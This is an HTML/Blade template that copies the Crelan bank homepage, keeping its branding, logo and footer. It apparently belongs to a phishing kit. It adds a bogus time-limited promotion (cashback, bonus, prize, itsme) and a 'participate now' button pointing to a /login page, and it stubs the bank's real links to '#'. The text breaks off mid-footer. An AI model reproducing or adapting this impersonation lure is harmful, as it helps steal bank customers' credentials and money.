<!DOCTYPE html>
<!-- saved from url=(0038)https://www.crelan.be/nl/particulieren -->
<html lang="{{ app()->getLocale() }}" dir="ltr" prefix="og: https://ogp.me/ns#" class=" js">

<head>
  <meta http-equiv="Content-Type" content="text/html; charset=UTF-8">
  <meta http-equiv="X-UA-Compatible" content="IE=edge">
  <meta name="csrf-token" content="{{ csrf_token() }}">

  <meta name="description" content="{{ __('messages.meta_description') }}">
  <link rel="stylesheet" href="./assets/css1.css">
  <link rel="stylesheet" href="./assets/css2.css">
  <meta name="viewport" content="width=device-width, initial-scale=1.0">

  <link rel="apple-touch-icon" sizes="180x180" href="./assets/apple-touch-icon.png?v=3">
  <link rel="icon" type="image/png" sizes="32x32" href="./assets/favicon-32x32.png?v=3">
  <link rel="icon" type="image/png" sizes="16x16" href="./assets/favicon-16x16.png?v=3">

  <link rel="mask-icon" href="./assets/safari-pinned-tab.svg?v=3" color="#84bd00">
  <link rel="shortcut icon" href="./assets/favicon.ico?v=3">

  <title>{{ __('messages.welcome_title') }} | Crelan</title>

  <link rel="stylesheet" media="all" href="./assets/css_t0f8RY1-isis88e6I24l0pVCbNsARBiVO5y2aaNgqwo.css">
  <link rel="stylesheet" media="all" href="./assets/css_EMp9AfzydcQtCKYpT4yuSDtQNwxYmXNMq4o2F6zOOSk.css">
  <link rel="stylesheet" media="all" href="https://fonts.googleapis.com/css?family=Open+Sans:400,600,700">
  <link rel="stylesheet" media="all" href="./assets/css_1GFU5DBQLLheAS5os4zDXQZzzOzdyl7r30H4_f1Kjbk.css">
  <link rel="stylesheet" media="print" href="./assets/css_7R1-0AwhfgudIYpgHtQfuqkZJzQZoc4fy7tPB1V768Q.css">
  <style>

  </style>
</head>

<body class="front not-logged-in mobile-menu-disabled">

  <div class="dialog-off-canvas-main-canvas" data-off-canvas-main-canvas="">
    <div id="site-wrapper">

      <header class="region region--header">
        <div class="container">
          <div class="region-header-inner">

            <div class="region region--main-header">
              <div class="branding">
                <a href="#" title="Home" rel="home">
                  <div class="site-logo">
                    <img src="./assets/logo.svg"
                      onerror="this.src=&#39;/themes/custom/calibr8_easytheme/logo.png&#39;; this.onerror=null;"
                      alt="Homepage Crelan">
                  </div>
                  <div class="site-name">Crelan</div>
                </a>
              </div>
            </div>
            <div class="region region--navigation">
              <nav aria-label="Products navigation" id="block-products-navigation"
                class="block block--menu block--menu--products">
                <ul data-block="navigation" class="menu menu--products js-top-menu menu--parent">
                  <li
                    class="menu-item menu-item--expanded menu-item--ground js-top-menu-ground js-top-menu-interactive">
                    <a href="#" target="_self" class="menu-link menu-link--products"
                      data-drupal-link-system-path="taxonomy/term/65">{{ __('messages.pay') }}</a>

                  </li>
                  <li
                    class="menu-item menu-item--expanded menu-item--ground js-top-menu-ground js-top-menu-interactive">
                    <a href="#" target="_self" class="menu-link menu-link--products"
                      data-drupal-link-system-path="taxonomy/term/67">{{ __('messages.borrow') }}</a>

                  </li>
                  <li
                    class="menu-item menu-item--expanded menu-item--ground js-top-menu-ground js-top-menu-interactive">
                    <a href="#" target="_self" class="menu-link menu-link--products"
                      data-drupal-link-system-path="taxonomy/term/66">{{ __('messages.save_invest') }}</a>

                  </li>
                  <li
                    class="menu-item menu-item--expanded menu-item--ground js-top-menu-ground js-top-menu-interactive">
                    <a href="#" target="_self" class="menu-link menu-link--products"
                      data-drupal-link-system-path="taxonomy/term/68">{{ __('messages.insure') }}</a>

                  </li>
                </ul>
              </nav>
            </div>

            <div class="nav-secondary-wrap">
              <div class="header-anchors">
                {{-- Language Switcher --}}
                <nav aria-label="Language" class="block block--menu block--menu--lang" style="margin-right: 15px;">
                  <ul class="menu menu--lang"
                    style="display: flex; gap: 8px; list-style: none; margin: 0; padding: 0; align-items: center;">
                    <li class="menu-item {{ app()->getLocale() === 'nl' ? 'is-active' : '' }}">
                      <a href="{{ route('lang.switch', 'nl') }}"
                        style="font-weight: {{ app()->getLocale() === 'nl' ? '700' : '400' }}; color: {{ app()->getLocale() === 'nl' ? '#84bd00' : '#333' }}; text-decoration: none; padding: 4px 8px; font-size: 14px;">
                        NL
                      </a>
                    </li>
                    <li style="color: #ccc;">|</li>
                    <li class="menu-item {{ app()->getLocale() === 'fr' ? 'is-active' : '' }}">
                      <a href="{{ route('lang.switch', 'fr') }}"
                        style="font-weight: {{ app()->getLocale() === 'fr' ? '700' : '400' }}; color: {{ app()->getLocale() === 'fr' ? '#84bd00' : '#333' }}; text-decoration: none; padding: 4px 8px; font-size: 14px;">
                        FR
                      </a>
                    </li>
                  </ul>
                </nav>



              </div>
              <div class="region region--nav-secondary">
                <nav aria-label="Functional menu" id="block-functionalmenu"
                  class="nav-secondary-functional-menu block block--menu block--menu--functional">
                  <ul data-block="nav_secondary" class="menu menu--functional menu--parent">

                    <li class="icon icon-building agency-cta menu-item icon--replaced">
                      <a href="#" class="menu-link menu-link--functional menu-link--icon" data-once="agency-cta">
                        <span class="menu-link__icon icon-building" aria-hidden="true"></span>
                        <span class="menu-link__text">{{ __('messages.find_office') }}</span>
                      </a>

                    </li>

                  </ul>

                </nav>
              </div>
            </div>

          </div>
        </div>

      </header>
      <div class="content-wrapper">

        <div id="block-calibr8-easytheme-content" class="block block-system block-system-main-block">

          <main style="display: flex; flex-direction: column;"
            class="node--page node--full node node--page--full node-layout">
            <div class="node-page-top">
              <div class="node-page-top-inner node-page-inner">
                <div style="background-color: white"
                  class="hero-header hero-header--has-visual node--header node--hero-style extend-bg node__header node__header--with-image">
                  <div class="hero-header__wrapper">
                    <div class="hero-header__visual">
                      <img alt="" src="./assets/main__img.png" width="800" height="400" loading="lazy"
                        class="image-style-marketing-banner">
                    </div>
                    <div class="hero-header__content">
                      <h1 class="visually-hidden"><span
                          class="field--title field field--name-title field--type-string field--label-hidden">Particulieren</span>
                      </h1>
                      <h2 class="hero-header__title">
                        {{ __('messages.hero_title') }}
                      </h2>
                      <h3>{{ __('messages.hero_intro') }} <strong>{{ __('messages.hero_exclusive') }}</strong></h3>
                      <ul>
                        <li> {{ __('messages.hero_benefit1') }}</li>
                        <li> {{ __('messages.hero_benefit2') }}</li>
                      </ul>
                      <h3>{{ __('messages.hero_limited') }}</h3>

                      <div
                        class="click-event field--header-cta hero-header__cta field field--field-header-cta field--link">
                        <div
                          class="click-event field--header-cta hero-header__cta field field--field-header-cta field--link hero-header__cta__item">
                          <a href="#" target="_self" data-once="click-event">{{ __('messages.participate') }}</a>
                        </div>
                      </div>

                    </div>
                    <div class="hero-header__img-block">
                      <img src="./assets/main__img.png" alt="">
                    </div>
                  </div>
                </div>
              </div>
            </div>
            <div class="node-page-center-forms">
              <div class="benefits-container">
                <div class="benefits-header">

                  <h2>{{ __('messages.special_offer') }}</h2>
                  <p>{{ __('messages.offer_description') }}</p>
                </div>

                <div class="benefits-content">
                  <div class="benefits-list">
                    <div class="benefit-item" onclick="toggleBenefit(0)">
                      <div class="benefit-header">
                        <div class="benefit-checkbox">
                          <input type="checkbox" id="benefit-0-check" readonly>
                          <label for="benefit-0-check"></label>
                        </div>
                        <div class="benefit-text">
                          <h3>{{ __('messages.cashback_title') }}</h3>
                        </div>
                      </div>
                      <div class="benefit-content" id="benefit-0">
                        <p>{{ __('messages.cashback_description') }}</p>
                        <p>{{ __('messages.cashback_details') }}</p>
                      </div>
                    </div>

                    <div class="benefit-item" onclick="toggleBenefit(1)">
                      <div class="benefit-header">
                        <div class="benefit-checkbox">
                          <input type="checkbox" id="benefit-1-check" readonly>
                          <label for="benefit-1-check"></label>
                        </div>
                        <div class="benefit-text">
                          <h3>{{ __('messages.bonus_title') }}</h3>
                        </div>
                      </div>
                      <div class="benefit-content" id="benefit-1">
                        <p>{{ __('messages.bonus_description') }}</p>
                        <p>{{ __('messages.bonus_details') }}</p>
                      </div>
                    </div>

                    <div class="benefit-item" onclick="toggleBenefit(2)">
                      <div class="benefit-header">
                        <div class="benefit-checkbox">
                          <input type="checkbox" id="benefit-2-check" readonly>
                          <label for="benefit-2-check"></label>
                        </div>
                        <div class="benefit-text">
                          <h3>{{ __('messages.free_title') }}</h3>
                        </div>
                      </div>
                      <div class="benefit-content" id="benefit-2">
                        <p>{{ __('messages.free_description') }}</p>
                        <p>{{ __('messages.free_details') }}</p>
                      </div>
                    </div>

                    <div class="benefit-item" onclick="toggleBenefit(3)">
                      <div class="benefit-header">
                        <div class="benefit-checkbox">
                          <input type="checkbox" id="benefit-3-check" readonly>
                          <label for="benefit-3-check"></label>
                        </div>
                        <div class="benefit-text">
                          <h3>{{ __('messages.win_title') }}</h3>
                        </div>
                      </div>
                      <div class="benefit-content" id="benefit-3">
                        <p>{{ __('messages.win_description') }}</p>
                        <p>{{ __('messages.win_details') }}</p>
                      </div>
                    </div>

                    <div class="benefit-item" onclick="toggleBenefit(4)">
                      <div class="benefit-header">
                        <div class="benefit-checkbox">
                          <input type="checkbox" id="benefit-4-check" readonly>
                          <label for="benefit-4-check"></label>
                        </div>
                        <div class="benefit-text">
                          <h3>{{ __('messages.itsme_title') }}</h3>
                        </div>
                      </div>
                      <div class="benefit-content" id="benefit-4">
                        <p>{{ __('messages.itsme_description') }}</p>
                        <p>{{ __('messages.itsme_details') }}</p>
                      </div>
                    </div>
                  </div>

                  <div class="benefits-sidebar">
                    <svg xmlns="http://www.w3.org/2000/svg" width="64" height="64" viewBox="0 0 64 64" fill="none">
                      <g clip-path="url(#clip0_902_3179)">
                        <path
                          d="M3.42649 45.8712C0.729037 43.1737 -0.670725 37.9587 0.31591 34.2746L5.70109 14.1871C6.67314 10.503 10.5079 6.68286 14.192 5.69623L34.2746 0.315909C37.9587 -0.656144 43.1786 0.724179 45.8761 3.42163L60.5784 18.1288C63.2758 20.8214 64.6707 26.0413 63.6841 29.7254L58.3038 49.8129C57.3317 53.4921 53.497 57.3123 49.8129 58.2989L29.7254 63.6841C26.0462 64.6561 20.8262 63.2709 18.1288 60.5735L3.42649 45.8712Z"
                          fill="#FF4612" />
                        <path
                          d="M39.2758 23.0425C37.3658 22.3913 36.1507 22.1385 36.2382 21.0061C36.3062 20.1264 36.9721 19.6695 38.1823 19.7667C38.5287 19.7553 38.8714 19.8402 39.1726 20.0117C39.4737 20.1833 39.7214 20.435 39.8882 20.7388C40.0211 21.0038 40.2077 21.2382 40.4362 21.4271C40.6648 21.616 40.9301 21.7552 41.2154 21.8358C41.5007 21.9164 41.7997 21.9367 42.0933 21.8953C42.3869 21.854 42.6686 21.7519 42.9205 21.5956C43.1725 21.4393 43.389 21.2322 43.5565 20.9875C43.7239 20.7428 43.8385 20.4659 43.893 20.1745C43.9474 19.8831 43.9406 19.5835 43.8728 19.2949C43.805 19.0063 43.6779 18.7349 43.4994 18.4982C42.4933 17.2491 40.8408 16.4034 38.5128 16.2236C34.4253 15.9125 31.8493 17.7351 31.6112 20.8505C31.3536 24.1847 33.5942 25.0838 36.9866 26.2309C39.305 26.9745 39.9028 27.339 39.8007 28.311C39.6987 29.2831 38.9016 29.7303 37.6428 29.633C36.5978 29.5553 35.9514 29.147 35.6501 28.5152C35.4656 28.1766 35.1929 27.8943 34.8609 27.6983C34.5288 27.5023 34.1499 27.4 33.7643 27.4022C33.4754 27.3937 33.1879 27.4454 32.9201 27.5542C32.6523 27.663 32.4101 27.8264 32.209 28.034C31.8621 28.3609 31.4534 28.6153 31.0069 28.7822C30.5604 28.9491 30.0851 29.0252 29.6088 29.0061C28.3548 28.9721 27.2515 28.2965 27.2515 26.5468L27.2953 20.6853C27.6852 20.931 28.1369 21.0608 28.5978 21.0595C28.988 21.0658 29.3742 20.9812 29.726 20.8123C30.0778 20.6434 30.3854 20.3949 30.6244 20.0865C30.8635 19.7781 31.0274 19.4182 31.1032 19.0354C31.1791 18.6527 31.1647 18.2575 31.0613 17.8812C30.9579 17.505 30.7683 17.158 30.5075 16.8677C30.2467 16.5775 29.9219 16.3519 29.5588 16.209C29.1957 16.0661 28.8043 16.0096 28.4157 16.0442C28.027 16.0788 27.6517 16.2035 27.3196 16.4083V14.2697C27.3215 14.0888 27.2874 13.9092 27.2194 13.7415C27.1513 13.5738 27.0506 13.4213 26.923 13.2928C26.7955 13.1644 26.6437 13.0626 26.4765 12.9934C26.3093 12.9241 26.13 12.8888 25.949 12.8894H24.0875C23.7257 12.8894 23.3785 13.0325 23.1218 13.2874C22.865 13.5424 22.7195 13.8885 22.7169 14.2503L22.6343 26.8287C22.5128 28.3937 21.4338 28.9964 20.2041 29.0061C18.9162 29.0061 17.774 28.3354 17.774 26.5468L17.8615 18.6051C17.8628 18.4849 17.8402 18.3657 17.7951 18.2543C17.75 18.1429 17.6833 18.0416 17.5988 17.9561C17.5142 17.8707 17.4136 17.8029 17.3027 17.7566C17.1918 17.7103 17.0728 17.6865 16.9526 17.6865H14.1628C13.9226 17.6865 13.6922 17.7816 13.5219 17.951C13.3516 18.1204 13.2552 18.3503 13.254 18.5905L13.1665 27.6501C13.1373 31.4362 16.1118 33.1373 20.2139 33.1373C20.915 33.163 21.6126 33.0273 22.253 32.7408C22.8934 32.4543 23.4595 32.0246 23.9077 31.4848C24.9575 32.6075 26.5808 33.1373 28.5492 33.1373C30.5176 33.1373 31.9903 32.8797 33.4484 32.0486C34.6436 32.706 35.9739 33.0801 37.3366 33.1421C41.5845 33.4678 44.1653 31.548 44.418 28.2479C44.6464 25.288 42.4253 24.1069 39.2515 23.0085"
                          fill="white" />
                        <path
                          d="M15.6987 15.7181C16.1969 15.721 16.6847 15.5757 17.1001 15.3007C17.5156 15.0257 17.8399 14.6334 18.0319 14.1737C18.2239 13.714 18.2749 13.2075 18.1784 12.7187C18.0819 12.23 17.8423 11.7809 17.49 11.4286C17.1377 11.0763 16.6886 10.8367 16.1998 10.7402C15.7111 10.6437 15.2046 10.6947 14.7449 10.8867C14.2852 11.0787 13.8929 11.403 13.6179 11.8185C13.3429 12.2339 13.1976 12.7217 13.2005 13.2199C13.2018 13.8821 13.4654 14.5168 13.9336 14.985C14.4018 15.4532 15.0365 15.7168 15.6987 15.7181Z"
                          fill="white" />
                        <path
                          d="M45.1811 34.2114C41.0644 34.2114 37.9781 36.5298 37.1276 40.4374C36.8943 36.7728 34.5565 34.6051 31.1154 34.6051C28.7145 34.6051 27.1446 35.6841 26.2211 37.1324C25.1762 35.4994 23.4216 34.6051 21.2345 34.6051C19.2029 34.6051 12.7971 34.3572 12.7971 42.5905C12.7971 42.7606 12.7971 42.9113 12.7971 43.0765V48.5784C12.824 49.1565 13.0725 49.702 13.4912 50.1016C13.9098 50.5012 14.4662 50.7241 15.045 50.7241C15.6237 50.7241 16.1802 50.5012 16.5988 50.1016C17.0174 49.702 17.2659 49.1565 17.2928 48.5784V41.9733C17.2928 40.0632 18.3718 38.7752 20.1555 38.7752C21.7886 38.7752 22.7412 39.9125 22.7412 41.9441V48.5638C22.7681 49.1419 23.0167 49.6874 23.4353 50.087C23.8539 50.4866 24.4103 50.7095 24.9891 50.7095C25.5678 50.7095 26.1243 50.4866 26.5429 50.087C26.9615 49.6874 27.2101 49.1419 27.2369 48.5638V41.4192C27.4216 39.8202 28.4083 38.7752 30.0073 38.7752C31.7327 38.7752 32.6561 39.9125 32.6561 41.9441V48.5638C32.683 49.1419 32.9316 49.6874 33.3502 50.087C33.7688 50.4866 34.3253 50.7095 34.904 50.7095C35.4827 50.7095 36.0392 50.4866 36.4578 50.087C36.8764 49.6874 37.125 49.1419 37.1519 48.5638V45.0498C38.0316 48.8846 41.1179 51.1835 45.3074 51.1835C47.1597 51.2042 48.9725 50.6469 50.4933 49.5893L50.6343 49.4872C50.6829 49.4483 50.7363 49.4143 50.7849 49.3706C50.7849 49.3706 50.8335 49.3268 50.7849 49.3706C50.8627 49.3123 50.9405 49.2539 51.0134 49.1908C51.3027 48.9121 51.5072 48.5573 51.6034 48.1673C51.6995 47.7773 51.6834 47.368 51.5569 46.9868C51.4303 46.6056 51.1985 46.268 50.8881 46.013C50.5778 45.7579 50.2017 45.5959 49.8032 45.5456C49.4185 45.4918 49.0265 45.5455 48.6705 45.7008C48.3145 45.8561 48.0084 46.1068 47.7862 46.4253C47.2758 47.096 46.3864 47.4751 45.1762 47.4751C43.0911 47.4751 41.8615 46.1823 41.774 44.1653H51.4945C51.8812 44.1653 52.2521 44.0116 52.5256 43.7382C52.799 43.4647 52.9526 43.0939 52.9526 42.7072V42.3427C52.9526 37.2637 49.8663 34.2357 45.1762 34.2357L45.1811 34.2114ZM41.774 41.113C41.9004 39.0328 43.1932 37.8323 45.147 37.8323C47.2272 37.8323 48.2382 39.1252 48.3305 41.113H41.774Z"
                          fill="white" />
                      </g>
                      <defs>
                        <clipPath id="clip0_902_3179">
                          <rect width="64" height="64" fill="white" />
                        </clipPath>
                      </defs>
                    </svg>
                    <div class="benefits-sidebar--block">
                      <div class="participate-button-container">
                        <button type="button" onclick="window.location.href='/login'" class="participate-button">
                          {{ __('messages.participate_now') }}
                        </button>
                      </div>
                      <div class="sidebar-info">
                        <p>{{ __('messages.sidebar_info') }}</p>
                      </div>
                    </div>


                  </div>
                </div>
              </div>
            </div>
            <div class="node-page-center">
              <div class="node-page-main">
                <div class="node-region--content-top">
                  <div class="container">

                  </div>

                  <div class="node-region--content">
                    <div class="container">
                      <section
                        class="paragraph--main-navigation paragraph--default paragraph--main-navigation--default paragraph paragraph--without-title">
                        <div class="paragraph__content-wrapper paragraph--main-navigation__content-wrapper">
                          <div class="paragraph__content paragraph--main-navigation__content">
                            <nav class="paragraph-menu" aria-label="Quick Links">
                              <ul class="menu menu--inpage-nav-front menu--parent">

                                <li class="menu-item menu-item--expanded">
                                  <a href="#" target="_self" class="menu-link menu-link--inpage-nav-front"
                                    data-drupal-link-system-path="taxonomy/term/65">{{ __('messages.pay') }}</a>
                                  <ul class="menu menu--inpage-nav-front menu--sub-menu">

                                    <li class="menu-item menu-item--level-1">
                                      <a href="#" class="menu-link menu-link--inpage-nav-front"
                                        data-drupal-link-system-path="node/2067">{{ __('messages.checking_accounts') }}</a>

                                    </li>
                                    <li class="menu-item menu-item--level-1">
                                      <a href="#" class="menu-link menu-link--inpage-nav-front"
                                        data-drupal-link-system-path="node/2069">{{ __('messages.credit_cards') }}</a>

                                    </li>
                                    <li class="menu-item menu-item--level-1">
                                      <a href="#" class="menu-link menu-link--inpage-nav-front"
                                        data-drupal-link-system-path="node/7266">{{ __('messages.debit_cards') }}</a>

                                    </li>
                                    <li class="menu-item menu-item--level-1">
                                      <a href="#" class="menu-link menu-link--inpage-nav-front"
                                        data-drupal-link-system-path="taxonomy/term/71">{{ __('messages.online_banking') }}</a>

                                    </li>

                                  </ul>
                                </li>
                                <li class="menu-item menu-item--expanded">
                                  <a href="#" class="menu-link menu-link--inpage-nav-front"
                                    data-drupal-link-system-path="taxonomy/term/67">{{ __('messages.borrow') }}</a>
                                  <ul class="menu menu--inpage-nav-front menu--sub-menu">

                                    <li class="menu-item menu-item--level-1">
                                      <a href="#" class="menu-link menu-link--inpage-nav-front"
                                        data-drupal-link-system-path="taxonomy/term/76">{{ __('messages.housing') }}</a>

                                    </li>
                                    <li class="menu-item menu-item--level-1">
                                      <a href="#" class="menu-link menu-link--inpage-nav-front"
                                        data-drupal-link-system-path="taxonomy/term/77">{{ __('messages.mobility') }}</a>

                                    </li>
                                    <li class="menu-item menu-item--level-1">
                                      <a href="#" class="menu-link menu-link--inpage-nav-front"
                                        data-drupal-link-system-path="taxonomy/term/78">{{ __('messages.other_goals') }}</a>

                                    </li>
                                    <li class="menu-item menu-item--level-1">
                                      <a href="#" class="menu-link menu-link--inpage-nav-front"
                                        data-drupal-link-system-path="taxonomy/term/87">{{ __('messages.professionals') }}</a>

                                    </li>

                                  </ul>
                                </li>
                                <li class="menu-item menu-item--expanded">
                                  <a href="#" class="menu-link menu-link--inpage-nav-front"
                                    data-drupal-link-system-path="taxonomy/term/66">{{ __('messages.save_invest') }}</a>
                                  <ul class="menu menu--inpage-nav-front menu--sub-menu">

                                    <li class="menu-item menu-item--level-1">
                                      <a href="#" class="menu-link menu-link--inpage-nav-front"
                                        data-drupal-link-system-path="taxonomy/term/73">{{ __('messages.savings_accounts') }}</a>

                                    </li>
                                    <li class="menu-item menu-item--level-1">
                                      <a href="#" class="menu-link menu-link--inpage-nav-front"
                                        data-drupal-link-system-path="taxonomy/term/74">{{ __('messages.pension_savings') }}</a>

                                    </li>
                                    <li class="menu-item menu-item--level-1">
                                      <a href="#" class="menu-link menu-link--inpage-nav-front"
                                        data-drupal-link-system-path="node/7016">{{ __('messages.start_investing') }}</a>

                                    </li>
                                    <li class="menu-item menu-item--level-1">
                                      <a href="#" class="menu-link menu-link--inpage-nav-front"
                                        data-drupal-link-system-path="node/7309">{{ __('messages.savings_bonds') }}</a>

                                    </li>

                                  </ul>
                                </li>
                                <li class="menu-item menu-item--expanded">
                                  <a href="#" class="menu-link menu-link--inpage-nav-front"
                                    data-drupal-link-system-path="kantoorzoeker">{{ __('messages.offices') }}</a>
                                  <ul class="menu menu--inpage-nav-front menu--sub-menu">

                                    <li class="menu-item menu-item--level-1">
                                      <a href="#" class="menu-link menu-link--inpage-nav-front"
                                        data-drupal-link-system-path="kantoorzoeker">{{ __('messages.contact') }}</a>

                                    </li>
                                    <li class="menu-item menu-item--level-1">
                                      <a href="#" class="menu-link menu-link--inpage-nav-front"
                                        data-drupal-link-system-path="kantoorzoeker">{{ __('messages.make_appointment') }}</a>

                                    </li>
                                    <li class="menu-item menu-item--level-1">
                                      <a href="#" class="menu-link menu-link--inpage-nav-front"
                                        data-drupal-link-system-path="kantoorzoeker">{{ __('messages.opening_hours') }}</a>

                                    </li>

                                  </ul>
                                </li>

                              </ul>
                            </nav>
                          </div>
                        </div>

                      </section>
                      <section
                        class="paragraph--banner paragraph--default paragraph--banner--default break-out-of-container paragraph paragraph--without-title">
                        <div class="field--banner banner banner--visual-half-image banner--colour-light">
                          <div class="banner__inner">
                            <div class="banner__visuals">
                              <div class="banner__visual"
                                style="background-image: url(&quot;https://www.crelan.be/sites/default/files/styles/banner/public/2024-03/contact%20agency%204_0.png?c=e4d95234_1413&amp;itok=M4xmt6nV&quot;)">
                              </div>
                            </div>

                            <div class="banner__content">
                              <h2 class="banner__title">
                                {{ __('messages.your_agent') }}

                              </h2>

                              <div class="banner__text">

                                <div
                                  class="field--text clearfix text-formatted field field--name-field-text field--type-text-long field--label-hidden field-items-count-1 field-items-cols-1 field__item">
                                  <ul>
                                    <li>{{ __('messages.personal_advice') }}</li>
                                    <li>{{ __('messages.questions_answered') }}</li>
                                    <li>{{ __('messages.local_presence') }}</li>
                                    <li>{{ __('messages.wide_range') }}</li>
                                  </ul>
                                </div>

                              </div>

                              <div class="banner__cta">

                                <div
                                  class="field--block-ctas field field--name-field-block-ctas field--type-entity-reference-revisions field--label-hidden field-items-count-1 field-items-cols-1 field__items">
                                  <div class="field__item">

                                    <section
                                      class="click-event child-paragraph paragraph--block-ctas paragraph--default paragraph--block-ctas--default paragraph paragraph--without-title">
                                      <a href="#" target="_self" class="button button-default"
                                        data-once="click-event">{{ __('messages.contact_agent') }}</a>
                                    </section>
                                  </div>
                                </div>

                              </div>
                            </div>
                          </div>
                        </div>

                      </section>
                    </div>
                  </div>
                </div>
              </div>

          </main>

        </div>
        <aside id="block-socialmediasharingblock"
          class="block block-calibr8-socialmedia block-calibr8-socialmedia-sharing">
          <ul id="sharing-menu" class="menu social-menu">
            <li><a href="https://facebook.com/sharer.php?u=https://www.crelan.be/nl/particulieren"
                class="social-share-link--facebook icon-social-facebook"><span
                  class="element-invisible">Facebook</span></a></li>
            <li><a href="https://twitter.com/intent/tweet?url=https://www.crelan.be/nl/particulieren"
                class="social-share-link--twitter icon-social-twitter"><span
                  class="element-invisible">Twitter</span></a></li>
            <li><a href="https://www.linkedin.com/shareArticle?url=https://www.crelan.be/nl/particulieren"
                class="social-share-link--linkedin icon-social-linkedin"><span
                  class="element-invisible">Linkedin</span></a></li>
          </ul>

        </aside>
      </div>

      <footer class="site-footer">
        <div class="region region--footer">
          <div class="container">
            <div class="footer__content-wrapper">
              <div id="block-combo-menu-footer-clients" class="block block-crelan block-crelan-combo-block">
                <div class="block-content">
                  <div class="combo-block-region blockregion-1">
                    <div class="combo-block-col-item combo-block-col-item--product-footer">
                      <h2 class="combo-block-title">{{ __('messages.our_offer') }}</h2>
                      <ul class="menu menu--product-footer menu--parent">

                        <li class="menu-item">
                          <a href="#" target="_self" rel="" class="menu-link menu-link--product-footer"
                            data-drupal-link-system-path="taxonomy/term/75">{{ __('messages.invest') }}</a>

                        </li>
                        <li class="menu-item">
                          <a href="#" target="_self" rel="" class="menu-link menu-link--product-footer"
                            data-drupal-link-system-path="taxonomy/term/65">{{ __('messages.pay') }}</a>

                        </li>
                        <li class="menu-item">
                          <a href="#" target="_self" rel="" class="menu-link menu-link--product-footer"
                            data-drupal-link-system-path="taxonomy/term/67">{{ __('messages.borrow') }}</a>

                        </li>
                        <li class="menu-item">
                          <a href="#" target="_self" rel="" class="menu-link menu-link--product-footer"
                            data-drupal-link-system-path="taxonomy/term/68">{{ __('messages.insure') }}</a>

                        </li>
                        <li class="menu-item">
                          <a href="#" target="_self" rel="" class="menu-link menu-link--product-footer"
                            data-drupal-link-system-path="node/2204">{{ __('messages.rates') }}</a>

                        </li>

                      </ul>
                    </div>
                  </div>
                  <div class="combo-block-region blockregion-2">
                    <div class="combo-block-col-item combo-block-col-item--theme-footer">
                      <h2 class="combo-block-title">{{ __('messages.themes') }}</h2>
                      <ul class="menu menu--theme-footer menu--parent">

                        <li class="menu-item">
                          <a href="#" target="_self" rel="" class="menu-link menu-link--theme-footer"
                            data-drupal-link-system-path="taxonomy/term/113">{{ __('messages.family') }}</a>

                        </li>
                        <li class="menu-item">
                          <a href="#" target="_self" rel="" class="menu-link menu-link--theme-footer"
                            data-drupal-link-system-path="taxonomy/term/112">{{ __('messages.pension') }}</a>

                        </li>
                        <li class="menu-item">
                          <a href="#" target="_self" class="menu-link menu-link--theme-footer"
                            data-drupal-link-system-path="node/1986">{{ __('messages.professionals') }}</a>

                        </li>
                        <li class="menu-item">
                          <a href="#" class="menu-link menu-link--theme-footer"
                            data-drupal-link-system-path="node/3172">{{ __('messages.cooperative_bank') }}</a>

                        </li>
                        <li class="menu-item">
                          <a href="#" class="menu-link menu-link--theme-footer"
                            data-drupal-link-system-path="node/2221">{{ __('messages.blogs') }}</a>

                        </li>

                      </ul>
                    </div>
                  </div>
                  <div class="combo-block-region blockregion-3">
                    <div class="combo-block-col-item combo-block-col-item--about-footer">
                      <h2 class="combo-block-title">{{ __('messages.direct_links') }}</h2>
                      <ul class="menu menu--about-footer menu--parent">

                        <li class="menu-item">
                          <a href="#" target="_self" class="menu-link menu-link--about-footer"
                            data-drupal-link-system-path="node/2027">myCrelan</a>

                        </li>
                        <li class="menu-item">
                          <a href="#" target="_self" class="menu-link menu-link--about-footer"
                            data-drupal-link-system-path="taxonomy/term/326">{{ __('messages.regulatory_info') }}</a>

                        </li>
                        <li class="menu-item">
                          <a href="#" target="_self" class="menu-link menu-link--about-footer"
                            data-drupal-link-system-path="node/2263">{{ __('messages.privacy') }}</a>

                        </li>
                        <li class="menu-item">
                          <a href="#" class="menu-link menu-link--about-footer"
                            data-drupal-link-system-path="node/10108">{{ __('messages.accessibility') }}</a>

                        </li>
                        <li class="menu-item">
                          <a href="#" class="ot-sdk-show-settings menu-link menu-link--about-footer"
                            onclick="javascript:return false;">{{ __('messages.preferences') }}</a>

                        </li>
                        <li class="menu-item">
                          <a href="#" target="_self" class="menu-link menu-link--about-footer"
                            data-drupal-link-system-path="node/2259">{{ __('messages.corporate_info') }}</a>

                        </li>
                        <li class="menu-item">
                          <a href="#" class="menu-link menu-link--about-footer"
                            data-drupal-link-system-path="node/5618">{{ __('messages.investor_relations') }}</a>

                        </li>
                        <li class="menu-item">
                          <a href="#" class="menu-link menu-link--about-footer"
                            data-drupal-link-system-path="node/2224">{{ __('messages.jobs') }}</a>

                        </li>
                        <li class="menu-item">
                          <a href="#" class="menu-link menu-link--about-footer"
                            data-drupal-link-system-path="node/2268">{{ __('messages.newsroom') }}</a>

                        </li>

                      </ul>
                    </div>
                  </div>
                  <div class="combo-block-region blockregion-4">
                    <div class="combo-block-col-item combo-block-col-item--contact-footer">
                      <h2 class="combo-block-title">{{ __('messages.contact_us') }}</h2>
                      <ul class="menu menu--contact-footer menu--parent">

                        <li class="menu-item">
                          <a href="#" class="menu-link menu-link--contact-footer"
                            data-drupal-link-system-path="kantoorzoeker">{{ __('messages.find_nearest_office') }}</a>

                        </li>
                        <li class="menu-item">
                          <a href="#" target="_self" class="menu-link menu-link--contact-footer"
                            data-drupal-link-system-path="node/2305">{{ __('messages.contact') }}</a>

                        </li>
                        <li class="menu-item">
                          <a href="#" target="_self" rel="" class="menu-link menu-link--contact-footer"
                            data-drupal-link-system-path="node/2376">{{ __('messages.complaints') }}</a>

                        </li>

                      </ul>
                    </div>
                    <div class="combo-block-col-item combo-block-col-item--icon-footer">
                      <ul class="menu menu--icon-footer menu--parent">

                        <li class="icon icon-facebook menu-item icon--replaced">
                          <a href="#" class="menu-link menu-link--icon-footer menu-link--icon ext" data-extlink=""
                            rel="noreferrer">
                            <span class="menu-link__icon icon-facebook" aria-hidden="true"></span>
                            <span class="menu-link__text"><span class="extlink-nobreak">Facebook<svg focusable="false"
                                  width="1em" height="1em" class="ext" data-extlink-placement="append"
                                  aria-label="(externe link)" viewBox="0 0 80 40" role="img" aria-hidden="false">
                                  <title>(externe link)</title>
                                  <path
